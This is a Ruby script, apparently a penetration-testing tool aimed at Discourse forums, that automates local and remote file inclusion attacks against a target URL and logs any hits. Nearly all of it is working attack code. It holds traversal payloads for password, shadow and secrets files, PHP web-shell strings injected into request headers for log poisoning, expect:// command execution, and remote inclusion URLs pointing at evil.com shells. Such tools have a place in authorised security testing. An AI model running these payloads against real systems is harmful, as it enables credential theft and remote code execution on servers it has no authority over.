#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'cgi'

class DiscourseLFI
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0,
        low_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\nüîç Starting LFI tests on #{@target_url}"
    puts "=" * 60
    
    # Basic LFI tests
    test_basic_lfi
    test_encoded_lfi
    test_double_encoded_lfi
    
    # Filter bypass techniques
    test_null_byte_lfi
    test_path_truncation_lfi
    test_wrapper_lfi
    
    # Advanced LFI techniques
    test_log_poisoning
    test_session_poisoning
    test_proc_self_environ
    test_proc_self_fd
    
    # Remote file inclusion
    test_rfi
    test_data_wrapper_rfi
    test_expect_wrapper
    
    # Specific endpoint tests
    test_upload_lfi
    test_avatar_lfi
    test_theme_lfi
    test_backup_lfi
    test_export_lfi
    
    # Plugin-specific LFI
    test_plugin_lfi
    
    # Admin panel LFI
    test_admin_lfi
    
    # API endpoint LFI
    test_api_lfi
    
    print_results
    save_results
    
    @results
  end
  
  def test_basic_lfi
    puts "\n[*] Testing basic LFI..."
    @results[:summary][:total_tests] += 1
    
    # Basic LFI payloads
    lfi_payloads = [
      '/etc/passwd',
      '/etc/shadow',
      '/etc/hosts',
      '/etc/hostname',
      '/etc/issue',
      '/proc/version',
      '/proc/self/environ',
      '/proc/self/cmdline',
      '/proc/self/status',
      '/var/log/auth.log',
      '/var/log/apache2/access.log',
      '/var/log/nginx/access.log',
      'C:\\windows\\win.ini',
      'C:\\windows\\system32\\drivers\\etc\\hosts',
      'C:\\boot.ini'
    ]
    
    # Test parameters
    test_params = [
      'file',
      'path',
      'page',
      'include',
      'template',
      'view',
      'doc',
      'document',
      'filename',
      'filepath',
      'load',
      'read',
      'src',
      'source'
    ]
    
    # Test endpoints
    test_endpoints = [
      '/',
      '/uploads',
      '/files',
      '/download',
      '/export',
      '/backup',
      '/admin',
      '/admin/logs',
      '/admin/backups'
    ]
    
    test_endpoints.each do |endpoint|
      test_params.each do |param|
        lfi_payloads.each do |payload|
          # Test GET request
          response = test_lfi_get(endpoint, param, payload)
          
          if response && check_lfi_success(response, payload)
            add_vulnerability({
              test_type: 'Basic LFI (GET)',
              endpoint: endpoint,
              method: 'GET',
              parameter: param,
              payload: payload,
              severity: determine_lfi_severity(payload),
              evidence: extract_lfi_evidence(response.body, payload),
              description: "LFI access to #{payload} via #{param} parameter"
            })
          end
          
          # Test POST request
          response = test_lfi_post(endpoint, param, payload)
          
          if response && check_lfi_success(response, payload)
            add_vulnerability({
              test_type: 'Basic LFI (POST)',
              endpoint: endpoint,
              method: 'POST',
              parameter: param,
              payload: payload,
              severity: determine_lfi_severity(payload),
              evidence: extract_lfi_evidence(response.body, payload),
              description: "LFI access to #{payload} via #{param} parameter"
            })
          end
        end
      end
    end
  end
  
  def test_encoded_lfi
    puts "\n[*] Testing encoded LFI..."
    @results[:summary][:total_tests] += 1
    
    # URL encoded payloads
    encoded_payloads = [
      '%2fetc%2fpasswd',
      '%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%252fetc%252fpasswd',
      '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    ]
    
    test_params = ['file', 'path', 'include']
    test_endpoints = ['/', '/uploads', '/files']
    
    test_endpoints.each do |endpoint|
      test_params.each do |param|
        encoded_payloads.each do |payload|
          response = test_lfi_get(endpoint, param, payload)
          
          if response && check_lfi_success(response, '/etc/passwd')
            add_vulnerability({
              test_type: 'Encoded LFI',
              endpoint: endpoint,
              method: 'GET',
              parameter: param,
              payload: payload,
              severity: 'High',
              evidence: extract_lfi_evidence(response.body, '/etc/passwd'),
              description: "Encoded LFI bypass successful"
            })
          end
        end
      end
    end
  end
  
  def test_double_encoded_lfi
    puts "\n[*] Testing double encoded LFI..."
    @results[:summary][:total_tests] += 1
    
    # Double encoded payloads
    double_encoded_payloads = [
      '%252fetc%252fpasswd',
      '%25252fetc%25252fpasswd',
      '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'
    ]
    
    test_params = ['file', 'path']
    test_endpoints = ['/', '/uploads']
    
    test_endpoints.each do |endpoint|
      test_params.each do |param|
        double_encoded_payloads.each do |payload|
          response = test_lfi_get(endpoint, param, payload)
          
          if response && check_lfi_success(response, '/etc/passwd')
            add_vulnerability({
              test_type: 'Double Encoded LFI',
              endpoint: endpoint,
              method: 'GET',
              parameter: param,
              payload: payload,
              severity: 'High',
              evidence: extract_lfi_evidence(response.body, '/etc/passwd'),
              description: "Double encoded LFI bypass successful"
            })
          end
        end
      end
    end
  end
  
  def test_null_byte_lfi
    puts "\n[*] Testing null byte LFI..."
    @results[:summary][:total_tests] += 1
    
    # Null byte payloads
    null_byte_payloads = [
      '/etc/passwd%00',
      '/etc/passwd%00.jpg',
      '/etc/passwd\x00',
      '/etc/passwd\x00.png',
      '../../../etc/passwd%00',
      '../../../etc/passwd%00.txt'
    ]
    
    test_params = ['file', 'path', 'include']
    test_endpoints = ['/', '/uploads', '/files']
    
    test_endpoints.each do |endpoint|
      test_params.each do |param|
        null_byte_payloads.each do |payload|
          response = test_lfi_get(endpoint, param, payload)
          
          if response && check_lfi_success(response, '/etc/passwd')
            add_vulnerability({
              test_type: 'Null Byte LFI',
              endpoint: endpoint,
              method: 'GET',
              parameter: param,
              payload: payload,
              severity: 'High',
              evidence: extract_lfi_evidence(response.body, '/etc/passwd'),
              description: "Null byte LFI bypass successful"
            })
          end
        end
      end
    end
  end
  
  def test_path_truncation_lfi
    puts "\n[*] Testing path truncation LFI..."
    @results[:summary][:total_tests] += 1
    
    # Path truncation payloads (4096 characters)
    base_payload = '/etc/passwd'
    truncation_payload = base_payload + ('A' * (4096 - base_payload.length))
    
    test_params = ['file', 'path']
    test_endpoints = ['/', '/uploads']
    
    test_endpoints.each do |endpoint|
      test_params.each do |param|
        response = test_lfi_get(endpoint, param, truncation_payload)
        
        if response && check_lfi_success(response, '/etc/passwd')
          add_vulnerability({
            test_type: 'Path Truncation LFI',
            endpoint: endpoint,
            method: 'GET',
            parameter: param,
            payload: truncation_payload[0..50] + '...',
            severity: 'High',
            evidence: extract_lfi_evidence(response.body, '/etc/passwd'),
            description: "Path truncation LFI bypass successful"
          })
        end
      end
    end
  end
  
  def test_wrapper_lfi
    puts "\n[*] Testing wrapper LFI..."
    @results[:summary][:total_tests] += 1
    
    # PHP wrapper payloads
    wrapper_payloads = [
      'php://filter/read=convert.base64-encode/resource=/etc/passwd',
      'php://filter/convert.base64-encode/resource=/etc/passwd',
      'php://filter/read=string.rot13/resource=/etc/passwd',
      'php://input',
      'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
      'expect://id',
      'zip:///var/www/html/file.zip%23shell.php',
      'phar:///var/www/html/file.phar/shell.php'
    ]
    
    test_params = ['file', 'path', 'include']
    test_endpoints = ['/', '/uploads', '/files']
    
    test_endpoints.each do |endpoint|
      test_params.each do |param|
        wrapper_payloads.each do |payload|
          response = test_lfi_get(endpoint, param, payload)
          
          if response && check_wrapper_success(response, payload)
            add_vulnerability({
              test_type: 'Wrapper LFI',
              endpoint: endpoint,
              method: 'GET',
              parameter: param,
              payload: payload,
              severity: 'Critical',
              evidence: extract_wrapper_evidence(response.body, payload),
              description: "Wrapper LFI successful: #{payload.split('://')[0]}"
            })
          end
        end
      end
    end
  end
  
  def test_log_poisoning
    puts "\n[*] Testing log poisoning..."
    @results[:summary][:total_tests] += 1
    
    # Log files to poison
    log_files = [
      '/var/log/apache2/access.log',
      '/var/log/nginx/access.log',
      '/var/log/auth.log',
      '/proc/self/environ'
    ]
    
    # Poison the logs first
    poison_payload = '<?php system($_GET["cmd"]); ?>'
    
    # Try to poison via User-Agent
    response = make_request(URI("#{@target_url}/"), 'GET', nil, {
      'User-Agent' => poison_payload
    })
    
    # Try to poison via Referer
    response = make_request(URI("#{@target_url}/"), 'GET', nil, {
      'Referer' => poison_payload
    })
    
    # Now try to include the poisoned logs
    log_files.each do |log_file|
      response = test_lfi_get('/', 'file', log_file)
      
      if response && check_log_poisoning_success(response)
        add_vulnerability({
          test_type: 'Log Poisoning LFI',
          endpoint: '/',
          method: 'GET',
          parameter: 'file',
          payload: log_file,
          severity: 'Critical',
          evidence: ['Log poisoning successful', 'PHP code execution possible'],
          description: "Log poisoning via #{log_file}"
        })
      end
    end
  end
  
  def test_session_poisoning
    puts "\n[*] Testing session poisoning..."
    @results[:summary][:total_tests] += 1
    
    # Try to poison session files
    session_payloads = [
      '<?php system($_GET["cmd"]); ?>',
      '<?php phpinfo(); ?>',
      '<?php echo "LFI_TEST_SUCCESS"; ?>'
    ]
    
    session_payloads.each do |payload|
      # Try to inject into session
      response = make_post_request("#{@target_url}/session", {
        'username' => payload,
        'data' => payload
      })
      
      # Try to include session files
      session_paths = [
        '/tmp/sess_' + SecureRandom.hex(16),
        '/var/lib/php/sessions/sess_' + SecureRandom.hex(16),
        '/var/lib/php5/sess_' + SecureRandom.hex(16)
      ]
      
      session_paths.each do |session_path|
        response = test_lfi_get('/', 'file', session_path)
        
        if response && check_session_poisoning_success(response)
          add_vulnerability({
            test_type: 'Session Poisoning LFI',
            endpoint: '/',
            method: 'GET',
            parameter: 'file',
            payload: session_path,
            severity: 'Critical',
            evidence: ['Session poisoning successful'],
            description: "Session poisoning via #{session_path}"
          })
        end
      end
    end
  end
  
  def test_proc_self_environ
    puts "\n[*] Testing /proc/self/environ..."
    @results[:summary][:total_tests] += 1
    
    # Try to poison environment variables
    poison_payload = '<?php system($_GET["cmd"]); ?>'
    
    response = make_request(URI("#{@target_url}/"), 'GET', nil, {
      'User-Agent' => poison_payload,
      'HTTP_CUSTOM_HEADER' => poison_payload
    })
    
    # Try to include /proc/self/environ
    response = test_lfi_get('/', 'file', '/proc/self/environ')
    
    if response && check_proc_environ_success(response)
      add_vulnerability({
        test_type: 'Proc Self Environ LFI',
        endpoint: '/',
        method: 'GET',
        parameter: 'file',
        payload: '/proc/self/environ',
        severity: 'Critical',
        evidence: ['Environment variable poisoning successful'],
        description: "LFI via /proc/self/environ with code injection"
      })
    end
  end
  
  def test_proc_self_fd
    puts "\n[*] Testing /proc/self/fd..."
    @results[:summary][:total_tests] += 1
    
    # Try to access file descriptors
    fd_numbers = (0..10).to_a
    
    fd_numbers.each do |fd|
      fd_path = "/proc/self/fd/#{fd}"
      
      response = test_lfi_get('/', 'file', fd_path)
      
      if response && check_proc_fd_success(response)
        add_vulnerability({
          test_type: 'Proc Self FD LFI',
          endpoint: '/',
          method: 'GET',
          parameter: 'file',
          payload: fd_path,
          severity: 'Medium',
          evidence: ['File descriptor access successful'],
          description: "LFI via #{fd_path}"
        })
      end
    end
  end
  
  def test_rfi
    puts "\n[*] Testing RFI..."
    @results[:summary][:total_tests] += 1
    
    # Remote file inclusion payloads
    rfi_payloads = [
      'http://evil.com/shell.txt',
      'https://pastebin.com/raw/malicious',
      'ftp://evil.com/shell.php',
      'http://127.0.0.1/shell.php',
      'http://localhost/shell.php'
    ]
    
    test_params = ['file', 'path', 'include', 'url']
    test_endpoints = ['/', '/uploads', '/files']
    
    test_endpoints.each do |endpoint|
      test_params.each do |param|
        rfi_payloads.each do |payload|
          response = test_lfi_get(endpoint, param, payload)
          
          if response && check_rfi_success(response)
            add_vulnerability({
              test_type: 'Remote File Inclusion (RFI)',
              endpoint: endpoint,
              method: 'GET',
              parameter: param,
              payload: payload,
              severity: 'Critical',
              evidence: ['Remote file inclusion successful'],
              description: "RFI via #{param} parameter"
            })
          end
        end
      end
    end
  end
  
  def test_data_wrapper_rfi
    puts "\n[*] Testing data wrapper RFI..."
    @results[:summary][:total_tests] += 1
    
    # Data wrapper payloads
    data_payloads = [
      'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==', # <?php phpinfo(); ?>
      'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+', # <?php system($_GET['cmd']); ?>
      'data://text/plain,<?php phpinfo(); ?>',
      'data://text/plain,<?php system($_GET["cmd"]); ?>'
    ]
    
    test_params = ['file', 'path', 'include']
    test_endpoints = ['/', '/uploads']
    
    test_endpoints.each do |endpoint|
      test_params.each do |param|
        data_payloads.each do |payload|
          response = test_lfi_get(endpoint, param, payload)
          
          if response && check_data_wrapper_success(response)
            add_vulnerability({
              test_type: 'Data Wrapper RFI',
              endpoint: endpoint,
              method: 'GET',
              parameter: param,
              payload: payload,
              severity: 'Critical',
              evidence: ['Data wrapper execution successful'],
              description: "Data wrapper RFI via #{param} parameter"
            })
          end
        end
      end
    end
  end
  
  def test_expect_wrapper
    puts "\n[*] Testing expect wrapper..."
    @results[:summary][:total_tests] += 1
    
    # Expect wrapper payloads
    expect_payloads = [
      'expect://id',
      'expect://whoami',
      'expect://ls',
      'expect://cat /etc/passwd'
    ]
    
    test_params = ['file', 'path', 'include']
    test_endpoints = ['/', '/uploads']
    
    test_endpoints.each do |endpoint|
      test_params.each do |param|
        expect_payloads.each do |payload|
          response = test_lfi_get(endpoint, param, payload)
          
          if response && check_expect_wrapper_success(response, payload)
            add_vulnerability({
              test_type: 'Expect Wrapper RCE',
              endpoint: endpoint,
              method: 'GET',
              parameter: param,
              payload: payload,
              severity: 'Critical',
              evidence: ['Command execution via expect wrapper'],
              description: "RCE via expect wrapper: #{payload}"
            })
          end
        end
      end
    end
  end
  
  def test_upload_lfi
    puts "\n[*] Testing upload LFI..."
    @results[:summary][:total_tests] += 1
    
    # Test LFI in upload functionality
    lfi_payloads = ['/etc/passwd', '../../../etc/passwd', '/proc/version']
    
    lfi_payloads.each do |payload|
      response = test_upload_lfi_request(payload)
      
      if response && check_lfi_success(response, payload)
        add_vulnerability({
          test_type: 'Upload LFI',
          endpoint: '/uploads',
          method: 'POST',
          parameter: 'file',
          payload: payload,
          severity: 'High',
          evidence: extract_lfi_evidence(response.body, payload),
          description: "LFI in upload functionality"
        })
      end
    end
  end
  
  def test_avatar_lfi
    puts "\n[*] Testing avatar LFI..."
    @results[:summary][:total_tests] += 1
    
    # Test LFI in avatar functionality
    lfi_payloads = ['/etc/passwd', '../../../etc/passwd']
    
    lfi_payloads.each do |payload|
      response = test_avatar_lfi_request(payload)
      
      if response && check_lfi_success(response, payload)
        add_vulnerability({
          test_type: 'Avatar LFI',
          endpoint: '/users/avatar',
          method: 'POST',
          parameter: 'avatar',
          payload: payload,
          severity: 'High',
          evidence: extract_lfi_evidence(response.body, payload),
          description: "LFI in avatar functionality"
        })
      end
    end
  end
  
  def test_theme_lfi
    puts "\n[*] Testing theme LFI..."
    @results[:summary][:total_tests] += 1
    
    # Test LFI in theme functionality
    lfi_payloads = ['/etc/passwd', '../../../config/database.yml']
    
    lfi_payloads.each do |payload|
      response = test_theme_lfi_request(payload)
      
      if response && check_lfi_success(response, payload)
        add_vulnerability({
          test_type: 'Theme LFI',
          endpoint: '/admin/themes',
          method: 'POST',
          parameter: 'theme_file',
          payload: payload,
          severity: 'High',
          evidence: extract_lfi_evidence(response.body, payload),
          description: "LFI in theme functionality"
        })
      end
    end
  end
  
  def test_backup_lfi
    puts "\n[*] Testing backup LFI..."
    @results[:summary][:total_tests] += 1
    
    # Test LFI in backup functionality
    lfi_payloads = ['/etc/passwd', '../../../config/secrets.yml']
    
    lfi_payloads.each do |payload|
      response = test_backup_lfi_request(payload)
      
      if response && check_lfi_success(response, payload)
        add_vulnerability({
          test_type: 'Backup LFI',
          endpoint: '/admin/backups',
          method: 'GET',
          parameter: 'filename',
          payload: payload,
          severity: 'Critical',
          evidence: extract_lfi_evidence(response.body, payload),
          description: "LFI in backup functionality"
        })
      end
    end
  end
  
  def test_export_lfi
    puts "\n[*] Testing export LFI..."
    @results[:summary][:total_tests] += 1
    
    # Test LFI in export functionality
    lfi_payloads = ['/etc/passwd', '../../../var/log/production.log']
    
    lfi_payloads.each do |payload|
      response = test_export_lfi_request(payload)
      
      if response && check_lfi_success(response, payload)
        add_vulnerability({
          test_type: 'Export LFI',
          endpoint: '/export',
          method: 'GET',
          parameter: 'file',
          payload: payload,
          severity: 'High',
          evidence: extract_lfi_evidence(response.body, payload),
          description: "LFI in export functionality"
        })
      end
    end
  end
  
  def test_plugin_lfi
    puts "\n[*] Testing plugin LFI..."
    @results[:summary][:total_tests] += 1
    
    # Test LFI in plugin endpoints
    plugin_tests = [
      { endpoint: '/chat/uploads', param: 'file', payload: '/etc/passwd' },
      { endpoint: '/poll/export', param: 'filename', payload: '../../../config/database.yml' },
      { endpoint: '/calendar/import', param: 'file', payload: '/proc/version' }
    ]
    
    plugin_tests.each do |test|
      response = test_lfi_get(test[:endpoint], test[:param], test[:payload])
      
      if response && check_lfi_success(response, test[:payload])
        add_vulnerability({
          test_type: 'Plugin LFI',
          endpoint: test[:endpoint],
          method: 'GET',
          parameter: test[:param],
          payload: test[:payload],
          severity: 'High',
          evidence: extract_lfi_evidence(response.body, test[:payload]),
          description: "LFI in plugin: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_admin_lfi
    puts "\n[*] Testing admin LFI..."
    @results[:summary][:total_tests] += 1
    
    # Test LFI in admin endpoints
    admin_tests = [
      { endpoint: '/admin/logs', param: 'file', payload: '/etc/passwd' },
      { endpoint: '/admin/backups/download', param: 'filename', payload: '../../../config/secrets.yml' },
      { endpoint: '/admin/customize/themes/import', param: 'file', payload: '/proc/version' }
    ]
    
    admin_tests.each do |test|
      response = test_lfi_get(test[:endpoint], test[:param], test[:payload])
      
      if response && check_lfi_success(response, test[:payload])
        add_vulnerability({
          test_type: 'Admin LFI',
          endpoint: test[:endpoint],
          method: 'GET',
          parameter: test[:param],
          payload: test[:payload],
          severity: 'Critical',
          evidence: extract_lfi_evidence(response.body, test[:payload]),
          description: "LFI in admin panel: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_api_lfi
    puts "\n[*] Testing API LFI..."
    @results[:summary][:total_tests] += 1
    
    # Test LFI in API endpoints
    api_tests = [
      { endpoint: '/api/v1/files', param: 'path', payload: '/etc/passwd' },
      { endpoint: '/api/v1/export', param: 'file', payload: '../../../config/database.yml' },
      { endpoint: '/api/v1/backup', param: 'filename', payload: '/proc/version' }
    ]
    
    api_tests.each do |test|
      response = test_lfi_get(test[:endpoint], test[:param], test[:payload])
      
      if response && check_lfi_success(response, test[:payload])
        add_vulnerability({
          test_type: 'API LFI',
          endpoint: test[:endpoint],
          method: 'GET',
          parameter: test[:param],
          payload: test[:payload],
          severity: 'High',
          evidence: extract_lfi_evidence(response.body, test[:payload]),
          description: "LFI in API: #{test[:endpoint]}"
        })
      end
    end
  end
  
  # Helper methods for testing
  def test_lfi_get(endpoint, param, payload)
    encoded_payload = CGI.escape(payload)
    make_request(URI("#{@target_url}#{endpoint}?#{param}=#{encoded_payload}"), 'GET')
  end
  
  def test_lfi_post(endpoint, param, payload)
    data = { param => payload }
    make_post_request("#{@target_url}#{endpoint}", data)
  end
  
  def test_upload_lfi_request(payload)
    data = { file: payload, filename: payload }
    make_post_request("#{@target_url}/uploads", data)
  end
  
  def test_avatar_lfi_request(payload)
    data = { avatar: payload, file: payload }
    make_post_request("#{@target_url}/users/avatar", data)
  end
  
  def test_theme_lfi_request(payload)
    data = { theme_file: payload, file: payload }
    make_post_request("#{@target_url}/admin/themes", data)
  end
  
  def test_backup_lfi_request(payload)
    make_request(URI("#{@target_url}/admin/backups?filename=#{CGI.escape(payload)}"), 'GET')
  end
  
  def test_export_lfi_request(payload)
    make_request(URI("#{@target_url}/export?file=#{CGI.escape(payload)}"), 'GET')
  end
  
  # Helper methods for checking success
  def check_lfi_success(response, payload)
    return false unless response && response.code.to_i < 400
    
    case payload
    when /passwd/
      response.body.match(/root:.*:0:0:/) || response.body.include?('root:x:0:0:')
    when /shadow/
      response.body.include?('root:$') || response.body.include?('root:!')
    when /hosts/
      response.body.include?('localhost') || response.body.include?('127.0.0.1')
    when /version/
      response.body.include?('Linux version') || response.body.include?('kernel')
    when /environ/
      response.body.include?('PATH=') || response.body.include?('HOME=')
    when /win\.ini/
      response.body.include?('[fonts]') || response.body.include?('[extensions]')
    when /boot\.ini/
      response.body.include?('[boot loader]') || response.body.include?('timeout=')
    else
      response.body.length > 0 && !response.body.include?('404') && !response.body.include?('Not Found')
    end
  end
  
  def check_wrapper_success(response, payload)
    return false unless response && response.code.to_i < 400
    
    case payload
    when /base64-encode/
      # Check for base64 encoded content
      response.body.match(/^[A-Za-z0-9+\/]+=*$/)
    when /php:\/\/input/
      response.body.include?('<?php') || response.body.include?('phpinfo')
    when /data:\/\/text\/plain/
      response.body.include?('<?php') || response.body.include?('phpinfo')
    when /expect:\/\//
      response.body.match(/uid=\d+/) || response.body.include?('root')
    else
      response.body.length > 0
    end
  end
  
  def check_log_poisoning_success(response)
    return false unless response && response.code.to_i < 400
    
    response.body.include?('<?php') || response.body.include?('system(')
  end
  
  def check_session_poisoning_success(response)
    return false unless response && response.code.to_i < 400
    
    response.body.include?('<?php') || response.body.include?('LFI_TEST_SUCCESS')
  end
  
  def check_proc_environ_success(response)
    return false unless response && response.code.to_i < 400
    
    response.body.include?('PATH=') && (response.body.include?('<?php') || response.body.include?('system('))
  end
  
  def check_proc_fd_success(response)
    return false unless response && response.code.to_i < 400
    
    response.body.length > 0 && !response.body.include?('No such file')
  end
  
  def check_rfi_success(response)
    return false unless response && response.code.to_i < 400
    
    # Check for successful remote inclusion
    response.body.include?('<?php') || response.body.include?('shell') || response.body.length > 100
  end
  
  def check_data_wrapper_success(response)
    return false unless response && response.code.to_i < 400
    
    response.body.include?('phpinfo') || response.body.include?('PHP Version') || response.body.include?('<?php')
  end
  
  def check_expect_wrapper_success(response, payload)
    return false unless response && response.code.to_i < 400
    
    case payload
    when /id|whoami/
      response.body.match(/uid=\d+/) || response.body.include?('root')
    when /ls/
      response.body.include?('total') || response.body.match(/\w+\s+\w+/)
    when /cat.*passwd/
      response.body.match(/root:.*:0:0:/)
    else
      response.body.length > 0
    end
  end
  
  # Helper methods for determining severity and extracting evidence
  def determine_lfi_severity(payload)
    case payload
    when /passwd|shadow|id_rsa|ssh.*key/
      'Critical'
    when /config|database|secret/
      'High'
    when /log|hosts|version/
      'Medium'
    else
      'Low'
    end
  end
  
  def extract_lfi_evidence(body, payload)
    evidence = []
    
    case payload
    when /passwd/
      evidence << 'passwd file content' if body.match(/root:.*:0:0:/)
    when /shadow/
      evidence << 'shadow file content' if body.include?('root:$')
    when /hosts/
      evidence << 'hosts file content' if body.include?('localhost')
    when /version/
      evidence << 'kernel version info' if body.include?('Linux version')
    when /environ/
      evidence << 'environment variables' if body.include?('PATH=')
    end
    
    evidence << 'File content accessible' if evidence.empty? && body.length > 0
    evidence
  end
  
  def extract_wrapper_evidence(body, payload)
    evidence = []
    
    case payload
    when /base64-encode/
      evidence << 'Base64 encoded file content'
    when /php:\/\/input/
      evidence << 'PHP input stream accessible'
    when /data:\/\/text\/plain/
      evidence << 'Data wrapper execution'
    when /expect:\/\//
      evidence << 'Command execution via expect'
    end
    
    evidence << 'Wrapper accessible' if evidence.empty?
    evidence
  end
  
  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      return nil
    end
  end
  
  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    when 'Low'
      @results[:summary][:low_vulns] += 1
    end
    
    puts "  ‚úì #{vuln_data[:severity]} LFI: #{vuln_data[:test_type]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE LFI TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    puts "Low Vulnerabilities: #{@results[:summary][:low_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Parameter: #{vuln[:parameter]}"
        puts "     Payload: #{vuln[:payload]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    filename = 'discourse_lfi_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  require 'securerandom'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse LFI Test Suite\n\n"
    opts.banner += "Usage: ruby discourse_lfi.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_lfi.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseLFI.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nüö® CRITICAL: LFI vulnerabilities found!"
      puts "   Local/Remote file inclusion possible!"
    else
      puts "\n‚úÖ No LFI vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end